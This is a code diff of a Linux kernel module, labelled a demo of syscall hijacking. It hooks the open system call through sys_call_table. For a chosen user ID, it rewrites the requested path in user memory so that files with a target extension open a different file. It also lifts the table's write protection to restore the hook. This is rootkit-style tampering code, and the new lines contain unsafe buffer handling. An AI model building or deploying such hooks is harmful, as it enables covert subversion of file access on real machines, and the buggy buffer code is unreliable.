@@ -1,5 +1,4 @@
 #include <linux/init.h>
-
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
@@ -29,7 +28,6 @@ MODULE_DESCRIPTION("Demo Application for Syscall Hijacking");
 
 static unsigned int uid;
 static void **sys_call_table;
-static kuid_t cur_uid;
 static char *filename, *target_extension;
 module_param(uid, uint, PERMISSION_OCTAL);
 MODULE_PARM_DESC(uid, " UID of the processes to attack");
@@ -65,16 +63,14 @@ static inline int user_strlen(const char *path){
 
 asmlinkage int (*original_open)(const char*, int, mode_t);
 asmlinkage int _hacked__NR_open(const char* path, int flags, mode_t mode){
-  char *cloned_path, extension[4];
+  char extension[4];
   int length = user_strlen(path);
-  cloned_path = (char*) (path + length - 4);
-  copy_from_user(extension, cloned_path, 4);
-  cur_uid = current_uid();
-  printk("Extension: %s\nTarget Extension: %s\n", extension, target_extension);
-  if(cur_uid.val == uid){
+  copy_from_user(extension, (char*)(path + length - 4), 4);
+  if(current_uid().val == uid){
+    printk(KERN_INFO "Extension: %s\nTarget Extension: %s\n", extension, target_extension);
     if(!strcasecmp(extension, target_extension)){
-      printk(KERN_INFO "Target file extension found. Filename %s. Patching.\n", path);  
-    return original_open(filename, flags, mode);
+    printk("Target file extension found. Patching");
+    copy_to_user((void*)path, filename, strlen(filename) + 1);
     }
   }
   return original_open(path, flags, mode);
@@ -91,9 +87,9 @@ static void __exit mod_exit(void){
   printk(KERN_INFO "Removing hacked open syscall\n");
   if (sys_call_table[__NR_open] != (void*) _hacked__NR_open)
     printk(KERN_ALERT "Some one else played with the syscall hook!\n");
-  sys_call_table[__NR_open] = (void*) original_open;
+  NO_PROTECTION(sys_call_table[__NR_open] = (void*) original_open);
   set_page_ro((unsigned long) sys_call_table);
-  printk(KERN_INFO "Removed\n");
+  printk("Removed\n");
 }
 
 module_init(mod_init);
